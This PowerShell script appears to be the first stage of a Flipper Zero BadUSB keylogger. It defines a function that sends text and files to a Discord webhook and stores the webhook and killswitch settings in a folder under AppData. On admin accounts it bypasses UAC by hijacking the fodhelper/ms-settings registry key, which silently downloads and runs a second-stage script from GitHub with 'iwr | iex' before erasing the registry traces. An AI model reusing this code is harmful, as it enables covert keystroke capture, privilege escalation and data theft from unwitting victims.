function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$hookurl = "$dc"

$Body = @{
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}

#################

Upload-Discord -text "Starting keylogger"

if (![System.IO.Directory]::Exists("$env:appdata\-locker")){New-Item -ItemType Directory -Force -Path "$env:appdata\-locker"};
echo $dc > "$env:appdata\-locker\wh.txt";
echo $log > "$env:appdata\-locker\log.txt";
echo $ks > "$env:appdata\-locker\killswitch.txt";

function s1 {
	$user = "$env:COMPUTERNAME\$env:USERNAME"
	$isAdmin = (Get-LocalGroupMember 'Administrators').Name -contains $user
if($isAdmin){
	Upload-Discord -text "User is admin"
	$259="powershell.exe -w h iwr https://raw.githubusercontent.com/I-Am-Jakoby/Flipper-Zero-BadUSB/main/Payloads/Flip-Keylogger/s2.ps1 | iex";
	reg add "HKCU\Software\Classes\.259\Shell\Open\command" /d $259 /f;reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".259" /f;fodhelper.exe;Start-Sleep -s 3;reg delete "HKCU\Software\Classes\.259\" /f;reg delete "HKCU\Software\Classes\ms-settings\" /f;

	}
	else{
	Upload-Discord -text "User is NOT admin"
	Break
	}
}

s1
